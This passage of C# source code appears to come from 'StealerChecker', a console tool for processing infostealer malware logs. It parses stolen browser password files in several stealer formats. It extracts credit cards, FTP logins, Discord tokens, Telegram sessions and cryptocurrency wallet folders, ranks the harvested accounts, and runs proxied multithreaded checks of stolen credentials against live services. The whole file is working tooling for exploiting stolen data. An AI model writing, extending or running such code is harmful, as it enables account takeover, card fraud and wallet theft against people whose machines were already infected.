                        for (int i1 = 0; i1 < filenames.Count; i1++)
                        {
                            string filename = filenames[i1];
                            var log = Regex.Matches(File.ReadAllText(filename).Replace("\r", ""), @"URL: (.*)\s*Login: (.*)\s*Password: (.*)");

                            passwords.AddRange(log.OfType<Match>()
                                        .Select(match => new Password(
                                            match.Groups[1].Value,
                                            match.Groups[2].Value,
                                            match.Groups[3].Value, filePas))
                                        .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                        }
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("_Information.txt"))
                {
                    try
                    {
                        var thisFile = Path.Combine(dir, "_AllPasswords_list.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(
                                        match.Groups[1].Value,
                                        match.Groups[2].Value,
                                        match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("information.txt"))
                {
                    try
                    {
                        var thisFile = Path.Combine(dir, "Browser", "Passwords.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"\| Site: (.*)\s*\| Login: (.*)\s*\| Pass: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(
                                        match.Groups[1].Value,
                                        match.Groups[2].Value,
                                        match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }

                    try
                    {
                        var thisFile = Path.Combine(dir, "passwords.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Host: (.*)\s*Login: (.*)\s*Password: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(
                                        match.Groups[1].Value,
                                        match.Groups[2].Value,
                                        match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("system_info.txt"))
                {
                    try
                    {
                        var thisFile = Path.Combine(dir, "passwords.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Site: (.*)\s*Username: (.*)\s*Password: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(
                                        match.Groups[1].Value,
                                        match.Groups[2].Value,
                                        match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("readme.txt")) // HUNTER
                {
                    try
                    {
                        var thisFile = Path.Combine(dir, "Browsers", "Passwords.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"\| Site: (.*)\s*\| Login: (.*)\s*\| Password: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(
                                        match.Groups[1].Value,
                                        match.Groups[2].Value,
                                        match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("LogInfo.txt")) // Unknown
                {
                    try
                    {
                        var thisFile = Path.Combine(dir, "General", "passwords.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(
                                        match.Groups[1].Value,
                                        match.Groups[2].Value,
                                        match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }

                counter++;
            }

            return passwords.Distinct();
        }
        internal static void ProcessServiceNew(List<Service> services)
        {
            Console.WriteLine("Please, wait...", Color.Cyan);
            int max = services.Count + services.Sum(x => x.Services.Count());
            int count = 0;

            for (int i = 0; i < services.Count; i++)
            {
                var servicefile = services[i];
                var categoryName = Path.Combine("Categories", servicefile.Name);

                if (!Directory.Exists(categoryName))
                    Directory.CreateDirectory(categoryName);
                foreach (var service in servicefile.Services)
                {
                    SetStatus($"Working... {Math.Round(GetPercent(max, count), 1)}%");

                    IEnumerable<string> result = SearchByURLHerlper(service);
                    if (result.Any())
                        File.WriteAllLines(Path.Combine(categoryName, service + ".txt"), result);
                    count++;
                }
                count++;
            }
            SetStatus();
        }

        #endregion
        #region EVERYTHING

        internal static async Task GetFilesAsync()
        {
            files.AddRange(
                (await GetPathsAsync(patterns).ConfigureAwait(false)).Select(x => new Log(x))
                .Where(x => patterns.Contains(x.Name))
                .Distinct());
            if (files.Count == 0)
            {
                Console.WriteLine("Seems, there is an Everything error.. Using normal method", Color.Pink);

                SetStatus("Adding Directories...");
                AddDirectories();
                Console.WriteLine($"Directories added: {directories.Count}", Color.Gray);
                SetStatus("Adding files...");
                AddFiles();
                Console.WriteLine($"Files added: {files.Count}", Color.Gray);
                SetStatus();
            }
        }

        private static int progress = 0;
        internal static async Task<List<string>> GetPathsAsync(List<string> patterns)
        {
            var pathsResult = new List<string>();
            var client = new EverythingClient();

            if (!opt.All)
            {
                // foreach array optimization
                foreach (var pattern in patterns.ToArray())
                {
                    SetStatus($"Loading [1/2]... {Math.Round(GetPercent(patterns.Count, progress++), 2)}%");
                    pathsResult.AddRange((await client.SearchAsync('"' + pattern + '"').ConfigureAwait(false)).Items
                                    .OfType<FileResultItem>()
                                    .Where(file => file.FullPath.StartsWith(opt.Path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))
                                    .Select(x => x.FullPath));
                }
            }
            else
            {
                // foreach array optimization
                foreach (var pattern in patterns.ToArray())
                {
                    SetStatus($"Loading [1/2]... {Math.Round(GetPercent(patterns.Count, progress++), 2)}%");
                    pathsResult.AddRange((await client.SearchAsync('"' + pattern + '"').ConfigureAwait(false)).Items
                                    .OfType<FileResultItem>()
                                    .Select(x => x.FullPath));
                }
            }
            return pathsResult;
        }

        #endregion
        #region MENU

        private static readonly Menu SearchMenu = new()
        {
            menu = new Dictionary<string, Action>()
                {
                    { "Search by URL", () => SearchByURL(Ext.Input("Enter query", Color.LightSkyBlue)) },
                    { "Search by Password", () => SearchByPass(Ext.Input("Enter query", Color.LightSkyBlue)) },
                    { "Search by Username", () => SearchByUsername(Ext.Input("Enter query", Color.LightSkyBlue)) }
                }.ToList(),
            Name = "Searhing"
        };
        private static readonly Menu SortMenu = new()
        {
            menu = new Dictionary<string, Action>()
                {
                    { "Sort by date", SortLogs },
                    { "Sort login:pass by categories", SortLogsbyCategories }
                }.ToList(),
            Name = "Sorting"
        };
        private static readonly Menu GetMenu = new()
        {
            menu = new Dictionary<string, Action>()
                {
                    { "Get CC cards", GetCC },
                    { "Get&Check FTP servers", GetFTP },
                    { "Get Discord tokens", GetDiscord },
                    { "Get Telegrams", GetTelegram },
                    { "Get Cold Wallets", () => WalletsMenu.Print() },
                }.ToList(),
            Name = "Getting"
        };
        private static readonly Menu WalletsMenu = new()
        {
            menu = new Dictionary<string, Action>()
                {
                    { "Get All Wallets", GetAllWallets },
                    { "Get Metamask Wallets", () => GetSpecWallets("Metamask") },
                    { "Get Exodus Wallets", () => GetSpecWallets("Exodus") },
                    { "Get Bitcoin Wallets", () => GetSpecWallets("Bitcoin") },
                    { "Get DogeCoin Wallets", () => GetSpecWallets("Dogecoin") }
                }.ToList(),
            Name = "Cold Wallets"
        };
        private static readonly Menu CheckersMenu = new()
        {
            menu = new Dictionary<string, Action>()
                {
                    { $"Check all services (current: {checkers?.Count})", CheckAll },
                    { "Set proxy (required for checkers)", SetProxy }
                }.ToList(),
            Name = "Check (ALPHA)"
        };
        internal static void PrintAnalysisMenu()
        {
            Console.Clear();
            Console.WriteLine("Analysis", Color.Pink);
            Console.WriteLine();
            Console.Write("1. Total Passwords - ", Color.LightCyan);
            Console.WriteLine(glob.Count(), Color.DarkCyan);
            Console.Write("2. Username in the password - ", Color.LightCyan);
            Console.WriteLine($"~{AnalyzeLoginInPass()}%", Color.DarkCyan);
            Console.Write("3. Username = password - ", Color.LightCyan);
            Console.WriteLine($"~{AnalyzeLoginEqualsPass()}%", Color.DarkCyan);
            Console.WriteLine("4. Most popular URLs:", Color.LightCyan);
            Console.WriteLine(AnalyzeMostPopularURLs(), Color.DarkCyan);
            Console.WriteLine();
            Console.WriteLine("5. Types of logs:", Color.LightCyan);
            Console.WriteLine(AnalyzeTypesOfLogs().Join(), Color.DarkCyan);
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintAnalysisMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintAnalysisMenu(); break;
            }
        }
        internal static void PrintMainMenu()
        {
            Console.WriteLine();
            Console.WriteAscii("StealerChecker", Color.Pink);
            Console.WriteLine(caption, Color.Pink);
            Console.WriteLine($"Loaded: {files.Count} logs", Color.Gray);
            Console.WriteLine();
            Console.WriteLine("1. Get", Color.LightCyan);
            Console.WriteLine("2. Search", Color.LightCyan);
            Console.WriteLine("3. Sort Logs", Color.LightCyan);
            Console.WriteLine("4. Analysis", Color.LightCyan);
            //Console.WriteLine("5. Check", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine($"88. Verbose: {opt.Verbose}", Color.Cyan);
            Console.WriteLine("99. Exit", Color.LightPink);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintMainMenu();
            }

            switch (selection)
            {
                case 1: GetMenu.Print(); break;
                case 2: SearchMenu.Print(); break;
                case 3: SortMenu.Print(); break;
                case 4: PrintAnalysisMenu(); break;
                case 5: CheckersMenu.Print(); break;

                case 88:
                    opt.Verbose = !opt.Verbose;
                    Console.Clear();
                    break;
                case 99: Environment.Exit(0); break;
                default:
                    Console.Clear();
                    PrintMainMenu();
                    break;
            }
        }

        #endregion
        #region ANALYSIS

        internal static string AnalyzeMostPopularURLs()
        {
            var top3 = new StringBuilder();
            var query = glob.GroupBy(x => x.Url)
                            .Select(group => new { group.Key, Count = group.Count() })
                            .Distinct()
                            .Where(x => !string.IsNullOrEmpty(x.Key))
                            .OrderByDescending(x => x.Count);
            foreach (var item in query.Take(3)) if (item.Key.Length > 3) top3.WriteLine($"\t{item.Key} - {Math.Round(GetPercent(glob.Count(), item.Count), 2)}% ({item.Count} accounts)");
            return top3.ToString();
        }
        internal static decimal AnalyzeLoginInPass()
        {
            var count = glob
                .Count(x => x.Pass.IndexOf(x.Login, StringComparison.OrdinalIgnoreCase) >= 0);

            return Math.Round(GetPercent(glob.Count(), count), 2);
        }
        internal static decimal AnalyzePercentOfURL(string url)
        {
            var count = glob
                .Count(x => x.Url.IndexOf(url, StringComparison.OrdinalIgnoreCase) >= 0);
            SetStatus();

            return Math.Round(GetPercent(glob.Count(), count), 2);
        }
        internal static decimal AnalyzeLoginEqualsPass()
        {
            var count = glob
                .Count(x => x.Pass.Equals(x.Login, StringComparison.OrdinalIgnoreCase));

            return Math.Round(GetPercent(glob.Count(), count), 2);
        }
        private static IEnumerable<string> AnalyzeTypesOfLogs()
        {
            var list = new List<KeyValuePair<string, int>>();
            for (int i = 0; i < patterns.Count; i++)
            {
                var pattern = patterns[i];
                var name = names[i];
                var count = files.Count(x => x.Name.Equals(pattern));

                if (count > 0)
                    list.Add(new KeyValuePair<string, int>(name, count));
            }

            return list.OrderByDescending(x => x.Value).Select(x => $"\t{x.Key} - {x.Value} logs");
        }
        internal static decimal GetPercent(int b, int a, decimal c = 100M)
        {
            if (b == 0) return 0;
            return a / (b / c);
        }

        #endregion
        #region UPDATING

        internal static void Update()
        {
            using var wc = new WebClient();
            wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275 (Edition Yx GX)";

            var json = JObject.Parse(wc.DownloadString("https://api.github.com/repos/kzorin52/stealerchecker/releases/latest"));
            var lastestTag = json["tag_name"].ToString();

            var rawTag = int.Parse(tag.Replace(".", ""));
            var rawLastestTag = int.Parse(lastestTag.Replace(".", ""));

            if (rawTag < rawLastestTag)
            {
                Console.WriteLine($"|| Warning! Update is aviable! Current version: {tag}, new version - {lastestTag} ||", Color.LightGreen);
                Console.WriteLine("|| For update go to https://github.com/kzorin52/stealerchecker/releases/latest ||", Color.LightGreen);
                Console.WriteLine("__ to continue press any key __", Color.LightCyan);
                Console.ReadKey();
            }
        }

        #endregion
        #region WALLETS

        private static readonly List<string> wallets = new()
        {
            "Atomic",
            "Exodus",
            "Electrum",
            "NetboxWallet",
            "Monero",
            "Bitcoin",
            "Lobstex",
            "Koto",
            "Metamask",
            "Dogecoin",
            "HappyCoin",
            "curecoin",
            "BitcoinGod",
            "BinanceChain",
            "Tronlink",
            "BitcoinCore",
            "Armory",
            "LitecoinCore",
            "Yoroi"
        };
        private static void GetAllWallets() { wallets.ForEach(wallet => GetSpecWallets(wallet)); }
        private static void GetSpecWallets(string WalletName)
        {
            var withWallet = files
                .Where(file => Directory.Exists(Path.Combine(new FileInfo(file.FullPath).Directory.FullName, "Wallets", WalletName)))
                .Select(file => new FileInfo(file.FullPath).Directory.FullName);

            if (!Directory.Exists(Path.Combine("Wallets", WalletName)))
                Directory.CreateDirectory(Path.Combine("Wallets", WalletName));

            int counter = 0;
            foreach (var walletFolder in withWallet)
            {
                SetStatus($"Working... [{WalletName}] [{counter}/{withWallet.Count()}]");
                CopyFiles(walletFolder, Path.Combine("Wallets", WalletName, new DirectoryInfo(walletFolder).Name));
                counter++;
            }

            Console.WriteLine($"Sucsess [{WalletName}]!", Color.LightGreen);
            SetStatus();
        }

        #endregion
        #region CHECKER

        private static readonly List<Checkers.IChecker> checkers = new()
        {
            new Checkers.Aternos()
        };
        private static List<string> proxy = new();
        private static ProxyType type;

        public static void Check(Checkers.IChecker checker)
        {
            if (!Directory.Exists("Checked"))
                Directory.CreateDirectory("Checked");

            var passwords = SearchByURLHerlper(checker.Service);
            var threads = new List<Thread>();
            var index = 0;

            foreach (var password in passwords.Shuffle())
            {
                threads.Add(new Thread(() =>
                {
                a:
                    try
                    {
                        if (index >= proxy.Count)
                            index = 0;

                        checker.ProcessLine(password, proxy[index++], type, out var result, out var isValid);

                        File.AppendAllText(Path.Combine("Checked", checker.Service + ".txt"), $"{password} - {(isValid ? "Valid" : "Not valid")}, info: {result + NewLine}");
                    }
                    catch
                    {
                        goto a;
                    }
                }));
            }
            foreach (var task in threads)
                task.Start();

            for (int i = 0; i < threads.Count; i++)
            {
                SetStatus($"Checking by {checker.Service}, {Convert.ToInt32(Math.Round(GetPercent(threads.Count, i), 1))}%");
                if (!threads[i].IsAlive)
                    threads[i].Wait();
            }
        }

        private static void CheckAll()
        {
            foreach (var item in checkers)
            {
                Console.WriteLine($"Checking {item.Service}");
                Check(item);
            }
        }

        private static void SetProxy()
        {
            Console.WriteLine("First, set proxy type:", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1) Socks5", Color.LightCyan);
            Console.WriteLine("2) Socks4", Color.LightCyan);
            Console.WriteLine("3) HTTP/s", Color.LightCyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintMainMenu();
            }

            switch (selection)
            {
                case 1: type = ProxyType.Socks5; break;
                case 2: type = ProxyType.Socks4; break;
                case 3: type = ProxyType.HTTP; break;

                default:
                    Console.Clear();
                    SetProxy();
                    break;
            }

        again:
            Console.WriteLine("Second, set proxylist file:", Color.Pink);
            Console.WriteLine();
            try
            {
                proxy = File.ReadAllLines(Console.ReadLine()).ToList();
            }
            catch
            {
                Console.Clear();
                goto again;
            }
        }

        #endregion
        #region ANTIPUBLIC

        private static string GetHash(string path) => FileCl.Load(path).Hashes.GetCRC32();
        public static IEnumerable<KeyValuePair<string, string>> GetAllHashes()
        {
            var list = new List<KeyValuePair<string, string>>();
            var ths = new List<Thread>();

            int y = 0;
            foreach (var file in files)
            {
                ths.Add(new Thread(() =>
                {
                    SetStatus($"Getting hashes... {Math.Round(GetPercent(files.Count, y++), 3)}%");
                    try
                    {
                        list.Add(new KeyValuePair<string, string>(file.Name, GetHash(file.FullPath)));
                    }
                    catch { }
                }));
            }

            foreach (var item in ths) item.Start();

            int i = 0;
            foreach (var item in ths)
            {
                SetStatus($"Waiting... {Math.Round(GetPercent(ths.Count, i++), 3)}%");
                item.Wait();
            }

            return list;
        }

        #endregion
    }
}